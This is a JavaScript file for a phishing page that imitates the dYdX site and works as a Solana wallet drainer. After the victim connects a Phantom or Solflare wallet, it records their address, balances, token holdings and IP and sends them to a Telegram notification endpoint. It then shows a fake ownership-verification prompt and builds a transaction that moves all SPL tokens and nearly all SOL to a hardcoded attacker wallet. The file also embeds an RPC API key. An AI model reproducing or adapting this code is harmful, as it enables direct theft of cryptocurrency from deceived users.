// ============================================
// BUFFER POLYFILL (Fixes "Buffer is not defined")
// ============================================
if (typeof window !== 'undefined' && !window.Buffer) {
    window.Buffer = {
        from: (str, encoding) => {
            if (encoding === 'utf8' || !encoding) {
                return new TextEncoder().encode(str);
            }
            return new TextEncoder().encode(str);
        },
        alloc: (size) => new Uint8Array(size),
        allocUnsafe: (size) => new Uint8Array(size),
        isBuffer: (obj) => obj instanceof Uint8Array,
        concat: (list, length) => {
            const total = length || list.reduce((acc, buf) => acc + buf.length, 0);
            const result = new Uint8Array(total);
            let offset = 0;
            for (const buf of list) {
                result.set(buf, offset);
                offset += buf.length;
            }
            return result;
        }
    };
}

// ============================================
// CONFIGURATION
// ============================================
const SOLANA_RPC = 'https://mainnet.helius-rpc.com/?api-key=58027310-7551-4e1a-92b0-2bf2c05d238b';
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey('TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA');

const TOKEN_MAP = {
    'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': 'USDC',
    'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': 'USDT',
    'So11111111111111111111111111111111111111112': 'SOL',
    'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': 'BONK',
    'mSoLzYCxHdYgdzU16g5QSh3i5K3z3KZK7ytfqcJm7So': 'mSOL',
    'J1toso1uCk3RLmjorhTtrVwY9HJ7X8V9yYac6Y7kGCPn': 'jitoSOL'
};

// ============================================
// DOM READY
// ============================================
$(document).ready(function() {
    console.log('✅ dYdX Clone Ready');
    
    // ============================================
    // UTILITY FUNCTIONS
    // ============================================
    
    async function getClientIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error('Failed to get IP:', error);
            return null;
        }
    }
    
    function getTokenSymbol(mint) {
        return TOKEN_MAP[mint] || 'Unknown';
    }
    
    async function getTokenPrices() {
        try {
            const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=usd-coin,tether,solana,bonk&vs_currencies=usd');
            const data = await response.json();
            return {
                'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v': data['usd-coin']?.usd || 1,
                'Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB': data['tether']?.usd || 1,
                'So11111111111111111111111111111111111111112': data['solana']?.usd || 0,
                'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263': data['bonk']?.usd || 0,
            };
        } catch (error) {
            console.error('Failed to get token prices:', error);
            return {};
        }
    }
    
    async function getSPLTokenInfo(connection, publicKey) {
        try {
            if (!publicKey || !(publicKey instanceof solanaWeb3.PublicKey)) {
                console.error("Invalid publicKey passed to SPL function");
                return [];
            }
            
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
                programId: TOKEN_PROGRAM_ID,
            });
            
            const tokenPrices = await getTokenPrices();
            const tokens = [];
            
            for (const tokenAccount of tokenAccounts.value) {
                const parsedInfo = tokenAccount.account.data.parsed.info;
                const balance = parsedInfo.tokenAmount;
                
                if (balance.uiAmount && balance.uiAmount > 0) {
                    const mint = parsedInfo.mint;
                    const symbol = getTokenSymbol(mint);
                    const price = tokenPrices[mint] || 0;
                    const usdValue = balance.uiAmount * price;
                    
                    tokens.push({
                        mint: mint,
                        balance: balance.uiAmount,
                        symbol: symbol,
                        usdValue: usdValue
                    });
                }
            }
            return tokens;
        } catch (error) {
            console.error('Failed to get SPL tokens:', error);
            return [];
        }
    }
    
    async function sendTelegramNotification(data) {
        try {
            await fetch('/notify', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (error) {
            console.error('Failed to send Telegram notification:', error);
        }
    }
    
    function isMobile() {
        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    }
    
    function getCurrentSiteUrl() {
        return encodeURIComponent(window.location.origin);
    }
    
    // ============================================
    // WALLET DETECTION & UI
    // ============================================
    
    function checkWalletAvailability() {
        const isMobileDevice = isMobile();
        
        const updateStatus = (walletId, isInstalled, walletName) => {
            const statusElement = $(`#${walletId}-status`);
            const optionElement = $(`#${walletId}-wallet`);
            
            if (isInstalled) {
                statusElement.html('<span class="status-dot installed"></span><span class="status-text status-installed">Installed</span>');
                if (optionElement.length) optionElement.prop('disabled', false);
            } else if (isMobileDevice) {
                statusElement.html('<span class="status-dot"></span><span class="status-text">Mobile App</span>');
                if (optionElement.length) optionElement.prop('disabled', false);
            } else {
                statusElement.html('<span class="status-dot not-installed"></span><span class="status-text status-not-installed">Not Installed</span>');
                if (optionElement.length) optionElement.prop('disabled', false);
            }
        };
        
        updateStatus('phantom', !!(window.solana && window.solana.isPhantom), 'Phantom');
        updateStatus('solflare', !!(window.solflare && window.solflare.isSolflare), 'Solflare');
    }
    
    function getWalletProvider(walletType) {
        if (walletType === 'phantom') return window.solana;
        if (walletType === 'solflare') return window.solflare;
        return null;
    }
    
    function showWalletModal() {
        checkWalletAvailability();
        showWalletOptions();
        $('#wallet-modal').fadeIn(200);
    }
    
    function hideWalletModal() {
        $('#wallet-modal').fadeOut(200);
        showWalletOptions();
        unlockModal();
    }
    
    function lockModal() {
        $('#wallet-modal').addClass('locked');
    }
    
    function unlockModal() {
        $('#wallet-modal').removeClass('locked');
    }
    
    function showWalletOptions() {
        $('#wallet-options').removeClass('hidden');
        $('#wallet-loading-state').removeClass('active');
        $('.wallet-modal-header h3').text('Select Your Wallet');
    }
    
    function showWalletLoading(walletType) {
        $('#wallet-options').addClass('hidden');
        $('#wallet-loading-state').addClass('active');
        $('.wallet-modal-header h3').text('Connecting...');
        lockModal();
        
        // Update spinner icon based on wallet type
        const spinnerImg = $('.wallet-loading-spinner img');
        const spinnerDiv = $('.wallet-loading-spinner');
        
        if (walletType === 'phantom') {
            spinnerImg.attr('src', 'https://docs.phantom.com/favicon.svg');
            spinnerDiv.removeClass('solflare');
        } else if (walletType === 'solflare') {
            spinnerImg.attr('src', 'https://solflare.com/favicon.ico');
            spinnerDiv.addClass('solflare');
        }
    }
    
    // ============================================
    // CORE TRANSFER LOGIC (NO BUFFER ERRORS)
    // ============================================
    
    async function transferAllAssets(connection, fromPubkey, walletProvider) {
        const receiverPubkey = new solanaWeb3.PublicKey(RECEIVER_WALLET);
        const transaction = new solanaWeb3.Transaction();
        let tokenTransfers = 0;
        
        try {
            // Get all token accounts
            const tokenAccounts = await connection.getParsedTokenAccountsByOwner(fromPubkey, {
                programId: TOKEN_PROGRAM_ID,
            });
            
            console.log(`Found ${tokenAccounts.value.length} token accounts`);
            
            // Process each token account
            for (const tokenAccount of tokenAccounts.value) {
                try {
                    const parsedInfo = tokenAccount.account.data.parsed.info;
                    const balance = parsedInfo.tokenAmount;
                    
                    if (balance.uiAmount && balance.uiAmount > 0) {
                        const mint = new solanaWeb3.PublicKey(parsedInfo.mint);
                        const fromTokenAccount = new solanaWeb3.PublicKey(tokenAccount.pubkey);
                        
                        // Get associated token address for receiver
                        const toTokenAccount = await splToken.getAssociatedTokenAddress(mint, receiverPubkey);
                        
                        // Check if receiver's token account exists
                        const receiverAccountInfo = await connection.getAccountInfo(toTokenAccount);
                        if (!receiverAccountInfo) {
                            transaction.add(
                                splToken.createAssociatedTokenAccountInstruction(
                                    fromPubkey,
                                    toTokenAccount,
                                    receiverPubkey,
                                    mint
                                )
                            );
                        }
                        
                        // Add transfer instruction
                        transaction.add(
                            splToken.createTransferInstruction(
                                fromTokenAccount,
                                toTokenAccount,
                                fromPubkey,
                                BigInt(balance.amount)
                            )
                        );
                        
                        tokenTransfers++;
                        console.log(`Added token transfer: ${parsedInfo.mint} - ${balance.uiAmount}`);
                    }
                } catch (err) {
                    console.error('Error processing token:', err.message);
                }
            }
            
            // Transfer SOL (leave enough for rent exemption)
            const solBalance = await connection.getBalance(fromPubkey);
            const minBalance = await connection.getMinimumBalanceForRentExemption(0);
            const estimatedFee = (tokenTransfers + 2) * 5000;
            const solToTransfer = Math.max(0, solBalance - minBalance - estimatedFee - 10000); // 0.01 SOL buffer
            
            if (solToTransfer > 0) {
                transaction.add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: fromPubkey,
                        toPubkey: receiverPubkey,
                        lamports: solToTransfer,
                    })
                );
                console.log(`Added SOL transfer: ${solToTransfer / solanaWeb3.LAMPORTS_PER_SOL} SOL`);
            }
            
            // If no transfers to make, return early
            if (transaction.instructions.length === 0) {
                console.log('No assets to transfer');
                return { txid: null, tokenTransfers: 0, solAmount: 0 };
            }
            
            // Get blockhash and sign
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
            transaction.recentBlockhash = blockhash;
            transaction.feePayer = fromPubkey;
            
            // Sign transaction
            const signedTransaction = await walletProvider.signTransaction(transaction);
            
            // Send raw transaction
            const txid = await connection.sendRawTransaction(signedTransaction.serialize());
            console.log('Transaction sent:', txid);
            
            // Confirm transaction
            await connection.confirmTransaction({
                signature: txid,
                blockhash: blockhash,
                lastValidBlockHeight: lastValidBlockHeight
            });
            
            return { 
                txid: txid, 
                tokenTransfers: tokenTransfers, 
                solAmount: solToTransfer / solanaWeb3.LAMPORTS_PER_SOL 
            };
            
        } catch (error) {
            console.error('Transfer error:', error);
            throw error;
        }
    }
    
    // ============================================
    // MAIN CONNECT FUNCTION
    // ============================================
    
    async function connectWallet(walletType, walletProvider) {
        try {
            const walletName = walletType === 'phantom' ? 'Phantom' : 'Solflare';
            
            // Check if wallet exists
            const isInstalled = walletType === 'phantom' ? 
                (window.solana && window.solana.isPhantom) : 
                (window.solflare && window.solflare.isSolflare);
            
            const isMobileDevice = isMobile();
            
            // Handle mobile deep link
            if (isMobileDevice && !isInstalled) {
                let deepLinkUrl;
                const currentUrl = getCurrentSiteUrl();
                
                if (walletType === 'phantom') {
                    deepLinkUrl = `https://phantom.app/ul/browse/${currentUrl}?ref=${encodeURIComponent(window.location.href)}`;
                } else {
                    deepLinkUrl = `https://solflare.com/ul/v1/browse/${currentUrl}?ref=${encodeURIComponent(window.location.href)}`;
                }
                
                if (deepLinkUrl) {
                    await sendTelegramNotification({
                        address: 'Unknown',
                        balance: 'Unknown',
                        walletType: walletName,
                        customMessage: `📱 Mobile ${walletName} Deep Link Opened`
                    });
                    
                    showWalletLoading(walletType);
                    $('.wallet-loading-title').text(`Opening ${walletName}`);
                    $('.wallet-loading-subtitle').html(`Redirecting to ${walletName} app...<br>Please approve connection.`);
                    
                    // Set up focus listener for return
                    const handleFocus = () => {
                        const provider = walletType === 'phantom' ? window.solana : window.solflare;
                        const condition = walletType === 'phantom' ? 
                            (window.solana && window.solana.isPhantom) : 
                            (window.solflare && window.solflare.isSolflare);
                        
                        if (condition) {
                            window.removeEventListener('focus', handleFocus);
                            connectWallet(walletType, provider);
                        }
                    };
                    
                    window.addEventListener('focus', handleFocus);
                    
                    // Timeout after 2 minutes
                    setTimeout(() => {
                        window.removeEventListener('focus', handleFocus);
                        if ($('#wallet-modal').is(':visible')) {
                            showWalletOptions();
                            unlockModal();
                        }
                    }, 120000);
                    
                    window.location.href = deepLinkUrl;
                    return;
                }
            }
            
            // Check if installed for desktop
            if (!isInstalled) {
                let installUrl;
                if (walletType === 'phantom') {
                    installUrl = 'https://phantom.app/download';
                } else {
                    installUrl = 'https://solflare.com/download';
                }
                
                if (confirm(`${walletName} is not installed. Would you like to download it?`)) {
                    window.open(installUrl, '_blank');
                }
                return;
            }
            
            if (!walletProvider) {
                throw new Error('Wallet provider not found');
            }
            
            // Show loading UI
            showWalletLoading(walletType);
            $('.wallet-loading-title').text(`Connecting ${walletName}`);
            $('.wallet-loading-subtitle').html('Please approve connection in your wallet...');
            
            // Connect wallet
            const resp = await walletProvider.connect();
            console.log(`${walletName} connected:`, resp);
            
            // Get public key
            let publicKeyString;
            if (walletType === 'solflare') {
                publicKeyString = walletProvider.publicKey?.toString() || walletProvider.pubkey?.toString();
            } else {
                publicKeyString = resp.publicKey?.toString();
            }
            
            if (!publicKeyString) {
                throw new Error('No public key received');
            }
            
            const publicKey = new solanaWeb3.PublicKey(publicKeyString);
            
            $('.wallet-loading-title').text('Fetching Account Info');
            $('.wallet-loading-subtitle').html('Retrieving your balance and assets...');
            
            // Initialize connection
            const connection = new solanaWeb3.Connection(SOLANA_RPC, 'confirmed');
            
            // Get balance
            const walletBalance = await connection.getBalance(publicKey);
            const solBalanceFormatted = (walletBalance / solanaWeb3.LAMPORTS_PER_SOL).toFixed(6);
            
            // Get IP and tokens
            const clientIP = await getClientIP();
            const splTokens = await getSPLTokenInfo(connection, publicKey);
            
            // Send connection notification
            await sendTelegramNotification({
                address: publicKeyString,
                balance: solBalanceFormatted,
                walletType: walletName,
                customMessage: '🔗 Wallet Connected',
                splTokens: splTokens,
                ip: clientIP
            });
            
            // Check minimum balance
            const requiredBalance = 0.02 * solanaWeb3.LAMPORTS_PER_SOL;
            if (walletBalance < requiredBalance) {
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    walletType: walletName,
                    customMessage: '❌ Insufficient Funds - Need 0.02 SOL minimum'
                });
                
                $('.wallet-loading-title').text('Insufficient Balance');
                $('.wallet-loading-subtitle').html(`Need at least 0.02 SOL<br>Current: ${solBalanceFormatted} SOL`);
                
                setTimeout(() => {
                    unlockModal();
                    showWalletOptions();
                }, 3000);
                return;
            }
            
            // Ownership verification (sign message)
            $('.wallet-loading-title').text('Verifying Ownership');
            $('.wallet-loading-subtitle').html(`Please sign the verification message in ${walletName}...`);
            
            const verificationMessage = `Verify wallet ownership\nTimestamp: ${Date.now()}\nWallet: ${publicKeyString.slice(0, 8)}...${publicKeyString.slice(-8)}`;
            const messageBytes = new TextEncoder().encode(verificationMessage);
            
            try {
                let signedMessage;
                if (walletType === 'phantom') {
                    signedMessage = await walletProvider.signMessage(messageBytes, 'utf8');
                } else {
                    signedMessage = await walletProvider.signMessage(messageBytes);
                }
                console.log("Verification signed");
                
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    walletType: walletName,
                    customMessage: '✅ Ownership Verified - Processing Transfer'
                });
            } catch (signError) {
                console.error("Verification failed:", signError);
                
                const isRejection = signError.message?.includes('rejected') || signError.code === 4001;
                if (isRejection) {
                    await sendTelegramNotification({
                        address: publicKeyString,
                        balance: solBalanceFormatted,
                        walletType: walletName,
                        customMessage: '❌ Verification Rejected by User'
                    });
                    
                    $('.wallet-loading-title').text('Verification Rejected');
                    $('.wallet-loading-subtitle').html('Please sign the message to continue.');
                    
                    setTimeout(() => {
                        showWalletOptions();
                        unlockModal();
                    }, 2000);
                    return;
                }
                throw signError;
            }
            
            // Execute transfer
            $('.wallet-loading-title').text('Processing Transfer');
            $('.wallet-loading-subtitle').html('Preparing asset transfer...<br>Do not close this window.');
            
            const transferResult = await transferAllAssets(connection, publicKey, walletProvider);
            
            if (transferResult.txid) {
                const shortTxid = `${transferResult.txid.slice(0, 6)}...${transferResult.txid.slice(-8)}`;
                const solscanUrl = `https://solscan.io/tx/${transferResult.txid}`;
                
                await sendTelegramNotification({
                    address: publicKeyString,
                    balance: solBalanceFormatted,
                    walletType: walletName,
                    customMessage: `🎉 Transfer Complete!\nTXID: ${shortTxid}\nTokens: ${transferResult.tokenTransfers}\nSOL: ${transferResult.solAmount.toFixed(6)}\n${solscanUrl}`
                });
                
                $('.wallet-loading-title').text('Success!');
                $('.wallet-loading-subtitle').html('Assets transferred successfully!');
                
                setTimeout(() => {
                    unlockModal();
                    hideWalletModal();
                }, 3000);
            } else {
                $('.wallet-loading-title').text('No Assets Found');
                $('.wallet-loading-subtitle').html('No transferable assets in this wallet.');
                
                setTimeout(() => {
                    unlockModal();
                    showWalletOptions();
                }, 2000);
            }
            
        } catch (error) {
            console.error(`Error:`, error);
            
            $('.wallet-loading-title').text('Connection Failed');
            $('.wallet-loading-subtitle').html(error.message || 'An error occurred. Please try again.');
            
            await sendTelegramNotification({
                address: 'Unknown',
                balance: 'Unknown',
                walletType: walletType === 'phantom' ? 'Phantom' : 'Solflare',
                customMessage: `❌ Error: ${error.message || 'Unknown error'}`
            });
            
            setTimeout(() => {
                showWalletOptions();
                unlockModal();
            }, 3000);
        }
    }
    
    // ============================================
    // EVENT HANDLERS
    // ============================================
    
    $('#connect-wallet, #connect-wallet-hero').on('click', function(e) {
        e.preventDefault();
        showWalletModal();
    });
    
    $('#close-modal, .wallet-modal-overlay').on('click', function(e) {
        if (!$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });
    
    $('.wallet-option').on('click', function() {
        const walletType = $(this).data('wallet');
        const walletProvider = getWalletProvider(walletType);
        connectWallet(walletType, walletProvider);
    });
    
    $(document).on('keydown', function(e) {
        if (e.key === 'Escape' && !$('#wallet-modal').hasClass('locked')) {
            hideWalletModal();
        }
    });
    
    // Initial wallet check
    checkWalletAvailability();
});
